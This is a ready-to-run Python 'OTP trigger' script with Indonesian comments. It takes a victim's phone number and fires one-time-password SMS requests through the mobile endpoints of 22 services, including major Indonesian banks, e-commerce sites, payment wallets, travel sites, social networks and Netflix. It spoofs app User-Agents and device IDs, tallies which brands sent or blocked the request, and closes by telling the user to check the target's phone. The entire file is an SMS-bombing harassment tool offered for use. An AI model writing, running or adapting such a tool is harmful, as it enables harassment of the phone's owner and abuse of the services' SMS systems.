"""
OTS - OTP Trigger System menggunakan endpoint MOBILE APP brand Indonesia.
Versi mobile app biasanya lebih longgar proteksinya dibanding web.
"""

import requests, json, urllib3, random, time, hashlib, sys, os
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

class OTPTriggerMobile:
    def __init__(self, target_number):
        self.target = self._format(target_number)
        self.sent = 0
        self.blocked = 0
        self.errors = 0

    def _format(self, n):
        n = n.strip().replace("+","").replace(" ","").replace("-","")
        if n.startswith("0"): n = "62" + n[1:]
        return n

    def _local(self): 
        return "0" + self.target[2:] if self.target.startswith("62") else self.target
    def _plus(self):
        return "+" + self.target
    
    # ====================== BANK ======================
    
    def trigger_bca(self):
        """BCA mobile API - request OTP"""
        url = "https://ibank.klikbca.com/authentication/loginotp"
        data = {"msisdn": self._local(), "reqCode": "OTP", "clientId": "BCA-MOBILE"}
        headers = {"User-Agent": "BCAMobile/5.0 Android", "X-App": "bca-mobile"}
        try:
            r = requests.post(url, json=data, headers=headers, timeout=10)
            return "sent" if r.status_code == 200 else ("blocked" if "429" in str(r.status_code) else "error")
        except: return "error"

    def trigger_mandiri(self):
        """Mandiri mobile - Livin' by Mandiri"""
        url = "https://api.livinmandiri.com/api/otp/request"
        data = {"phoneNumber": self._local()}
        headers = {"User-Agent": "Livin/Android/3.0", "X-Device-Id": str(random.randint(1000000000,9999999999))}
        try:
            r = requests.post(url, json=data, headers=headers, timeout=10)
            return "sent" if r.status_code == 200 else "error"
        except: return "error"

    def trigger_bni(self):
        url = "https://api.bni.co.id/auth/request-otp"
        data = {"phoneNumber": self._local()}
        headers = {"User-Agent": "BNIMobile/Android/5.0"}
        try:
            r = requests.post(url, json=data, headers=headers, timeout=10)
            return "sent" if r.status_code == 200 else "error"
        except: return "error"

    def trigger_bri(self):
        url = "https://api.bri.co.id/auth/otp"
        data = {"phone": self._local()}
        headers = {"User-Agent": "BRImo/Android/4.0"}
        try:
            r = requests.post(url, json=data, headers=headers, timeout=10)
            return "sent" if r.status_code == 200 else "error"
        except: return "error"

    def trigger_bsi(self):
        url = "https://api.bsi.co.id/auth/request-otp"
        data = {"phone": self._local()}
        headers = {"User-Agent": "BSIMobile/Android/3.0"}
        try:
            r = requests.post(url, json=data, headers=headers, timeout=10)
            return "sent" if r.status_code == 200 else "error"
        except: return "error"

    # ====================== E-COMMERCE ======================

    def trigger_tokopedia(self):
        """Tokopedia mobile register OTP"""
        url = "https://api.tokopedia.com/v1/forget-password/send-otp"
        data = {"phone": self._local(), "source": "mobile"}
        headers = {
            "User-Agent": "Tokopedia/Android/9.0.0",
            "X-Platform": "Android",
            "Accept": "application/json"
        }
        try:
            r = requests.post(url, json=data, headers=headers, timeout=10)
            if r.status_code == 200: return "sent"
            return "blocked" if "429" in str(r.status_code) else "error"
        except: return "error"

    def trigger_shopee(self):
        """Shopee mobile register OTP"""
        url = "https://shopee.co.id/api/v2/user/login_otp"
        data = {"phone": self.target, "country_code": "62"}
        headers = {
            "User-Agent": "Shopee/Android/3.15.0",
            "X-Platform": "android",
            "Content-Type": "application/json"
        }
        try:
            r = requests.post(url, json=data, headers=headers, timeout=10)
            if r.status_code == 200: return "sent"
            return "blocked" if "rate" in r.text.lower() else "error"
        except: return "error"

    def trigger_lazada(self):
        """Lazada mobile register OTP"""
        url = "https://member.lazada.co.id/user/api/sendVerificationSms"
        data = {"phone": self._local(), "type": "OTP_REGISTER", "lzdAppVersion": "8.0"}
        headers = {
            "User-Agent": "Lazada/Android/8.0",
            "Origin": "https://member.lazada.co.id",
            "X-Requested-With": "com.lazada.android"
        }
        try:
            r = requests.post(url, json=data, headers=headers, timeout=10)
            if r.status_code == 200 and "fail" not in r.text.lower(): return "sent"
            return "blocked" if "limit" in r.text.lower() else "error"
        except: return "error"

    def trigger_blibli(self):
        url = "https://api.blibli.com/v3/auth/otp"
        data = {"phoneNumber": self._local()}
        headers = {"User-Agent": "Blibli/Android/4.0"}
        try:
            r = requests.post(url, json=data, headers=headers, timeout=10)
            return "sent" if r.status_code == 200 else "error"
        except: return "error"

    def trigger_bukalapak(self):
        url = "https://api.bukalapak.com/v2/otp/generate.json"
        data = {"phone": self._local(), "type": "login"}
        headers = {"User-Agent": "Bukalapak/Android/7.0"}
        try:
            r = requests.post(url, json=data, headers=headers, timeout=10)
            if r.status_code == 200: return "sent"
            return "blocked" if "limit" in r.text.lower() else "error"
        except: return "error"

    # ====================== FINANCE / PAYMENTS ======================
    
    def trigger_gojek(self):
        url = "https://goid.gojekapi.com/v1/phone/request-otp"
        data = {"phone": self.target}
        headers = {
            "User-Agent": "Gojek/Android/4.71",
            "X-App-Version": "4.71",
            "X-Platform": "Android",
            "X-Unique-Id": str(random.randint(100000,999999))
        }
        try:
            r = requests.post(url, json=data, headers=headers, timeout=10)
            if r.status_code == 200: return "sent"
            return "blocked" if "rate" in r.text.lower() else "error"
        except: return "error"

    def trigger_grab(self):
        url = "https://api.grab.com/v1/phone/request-otp"
        data = {"phone": self.target, "countryCode": "ID"}
        headers = {"User-Agent": "Grab/Android/8.0"}
        try:
            r = requests.post(url, json=data, headers=headers, timeout=10)
            if r.status_code == 200: return "sent"
            return "blocked" if "limit" in r.text.lower() else "error"
        except: return "error"

    def trigger_dana(self):
        url = "https://api.dana.id/sms/otp/v1/send"
        data = {"phone": self.target, "countryCode": "62", "action": "LOGIN"}
        headers = {"User-Agent": "DANA/Android/3.0"}
        try:
            r = requests.post(url, json=data, headers=headers, timeout=10)
            if r.status_code in (200,201): return "sent"
            return "blocked" if "block" in r.text.lower() else "error"
        except: return "error"

    def trigger_ovo(self):
        url = "https://api.ovo.id/v1.0/otp/request"
        data = {"phone": self.target, "deviceId": str(random.randint(1000000000,9999999999))}
        headers = {"User-Agent": "OVO/Android/3.58"}
        try:
            r = requests.post(url, json=data, headers=headers, timeout=10)
            if r.status_code == 200: return "sent"
            return "blocked" if "limit" in r.text.lower() else "error"
        except: return "error"

    def trigger_linkaja(self):
        url = "https://api.linkaja.com/v1/otp/request"
        data = {"phone": self._local(), "channel": "sms"}
        headers = {"User-Agent": "LinkAja/Android/3.0"}
        try:
            r = requests.post(url, json=data, headers=headers, timeout=10)
            if r.status_code == 200: return "sent"
            return "blocked" if "limit" in r.text.lower() else "error"
        except: return "error"

    # ====================== TRAVEL / LIFESTYLE ======================
    
    def trigger_traveloka(self):
        url = "https://api.traveloka.com/v3/auth/request-otp"
        data = {"phone": self._local(), "countryCode": "ID"}
        headers = {
            "User-Agent": "Traveloka/Android/3.0",
            "X-App-Version": "3.0",
            "X-Platform": "android"
        }
        try:
            r = requests.post(url, json=data, headers=headers, timeout=10)
            if r.status_code == 200: return "sent"
            return "blocked" if "limit" in r.text.lower() else "error"
        except: return "error"

    def trigger_tiket(self):
        url = "https://api.tiket.com/v1/user/request-otp"
        data = {"phone": self._local()}
        headers = {"User-Agent": "Tiket/Android/5.0"}
        try:
            r = requests.post(url, json=data, headers=headers, timeout=10)
            if r.status_code == 200: return "sent"
            return "blocked" if "limit" in r.text.lower() else "error"
        except: return "error"

    # ====================== SOCIAL / ENTERTAINMENT ======================
    
    def trigger_netflix(self):
        url = "https://www.netflix.com/id/login/sendOtp"
        data = {"phone": self._local()}
        headers = {"User-Agent": "Mozilla/5.0"}
        try:
            r = requests.post(url, json=data, headers=headers, timeout=10)
            if r.status_code == 200: return "sent"
            return "blocked" if "429" in str(r.status_code) else "error"
        except: return "error"

    def trigger_telegram(self):
        url = "https://my.telegram.org/auth/send_password"
        data = {"phone": self._plus()}
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        try:
            r = requests.post(url, data=data, headers=headers, timeout=10)
            if r.status_code == 200 and "random_hash" in r.text: return "sent"
            return "blocked" if "too many" in r.text.lower() else "error"
        except: return "error"

    def trigger_x(self):
        """Twitter/X OTP"""
        url = "https://api.x.com/1.1/account/send_phone_verification_code.json"
        data = {"phone_number": self._plus(), "country_code": "62", "lang": "id"}
        headers = {"User-Agent": "Twitter/Android/10.0"}
        try:
            r = requests.post(url, json=data, headers=headers, timeout=10)
            if r.status_code in (200,201): return "sent"
            return "blocked" if "rate" in r.text.lower() else "error"
        except: return "error"

    def trigger_instagram(self):
        url = "https://i.instagram.com/api/v1/accounts/send_two_factor_login_sms/"
        data = {"phone_number": self._local(), "device_id": str(random.randint(100000000,999999999))}
        headers = {"User-Agent": "Instagram 273.0.0.18.100 Android"}
        try:
            r = requests.post(url, json=data, headers=headers, timeout=10)
            if r.status_code == 200: return "sent"
            return "blocked" if "block" in r.text.lower() else "error"
        except: return "error"

    def trigger_facebook(self):
        url = "https://mbasic.facebook.com/mobile/register/"
        data = {"phone": self._local(), "country": "ID", "source": "m_register"}
        headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10)"}
        try:
            r = requests.post(url, data=data, headers=headers, timeout=10)
            if r.status_code == 200: return "sent"
            return "blocked" if "block" in r.text.lower() else "error"
        except: return "error"

    # ====================== BRAND MAP ======================
    
    BRANDS = {}
    CATEGORIES = {}

# Build brand map dynamically
brands_def = [
    ("bank", "bca", "BCA", "bank"),
    ("bank", "mandiri", "Mandiri", "bank"),
    ("bank", "bni", "BNI", "bank"),
    ("bank", "bri", "BRI", "bank"),
    ("bank", "bsi", "BSI", "bank"),
    ("ecom", "tokopedia", "Tokopedia", "e-commerce"),
    ("ecom", "shopee", "Shopee", "e-commerce"),
    ("ecom", "lazada", "Lazada", "e-commerce"),
    ("ecom", "blibli", "Blibli", "e-commerce"),
    ("ecom", "bukalapak", "Bukalapak", "e-commerce"),
    ("fin", "gojek", "Gojek", "finance"),
    ("fin", "grab", "Grab", "finance"),
    ("fin", "dana", "DANA", "finance"),
    ("fin", "ovo", "OVO", "finance"),
    ("fin", "linkaja", "LinkAja", "finance"),
    ("travel", "traveloka", "Traveloka", "travel"),
    ("travel", "tiket", "Tiket.com", "travel"),
    ("social", "x", "X / Twitter", "social-media"),
    ("social", "instagram", "Instagram", "social-media"),
    ("social", "facebook", "Facebook", "social-media"),
    ("social", "telegram", "Telegram", "social-media"),
    ("entertain", "netflix", "Netflix", "streaming"),
]

for _prefix, _key, _name, _cat in brands_def:
    fn_name = "trigger_" + _key
    if hasattr(OTPTriggerMobile, fn_name):
        OTPTriggerMobile.BRANDS[_key] = {"name": _name, "category": _cat, "fn": getattr(OTPTriggerMobile, fn_name)}
        if _cat not in OTPTriggerMobile.CATEGORIES:
            OTPTriggerMobile.CATEGORIES[_cat] = []
        OTPTriggerMobile.CATEGORIES[_cat].append(_key)

    def trigger(self, brand_key):
        brand = self.BRANDS.get(brand_key)
        if not brand: return "error"
        result = brand["fn"](self)
        if result == "sent": self.sent += 1
        elif result == "blocked": self.blocked += 1
        else: self.errors += 1
        return result

    OTPTriggerMobile.trigger = trigger


if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else input("Nomor target (contoh 62812xxx): ")
    
    t = OTPTriggerMobile(target)
    print(f"\nTesting {len(t.BRANDS)} endpoint mobile brand Indonesia…\n")
    
    results = {}
    for key in t.BRANDS:
        try:
            results[key] = t.trigger(key)
        except:
            results[key] = "error"
        # Rate limit protection
        time.sleep(3)
    
    print(f"\n{'='*50}")
    print("HASIL TEST ENDPOINT MOBILE")
    print(f"{'='*50}")
    for k, v in results.items():
        ico = {"sent":"✅","blocked":"🔴","error":"❌"}
        print(f"  {ico.get(v,'❌')} {t.BRANDS[k]['name']:<12} -> {v}")
    
    sent = sum(1 for v in results.values() if v == "sent")
    blocked = sum(1 for v in results.values() if v == "blocked")
    err = sum(1 for v in results.values() if v == "error")
    print(f"\n✅ {sent} sent | 🔴 {blocked} blocked | ❌ {err} error")
    print(f"\nCek HP target! SMS dari brand dengan status ✅ harusnya masuk.")
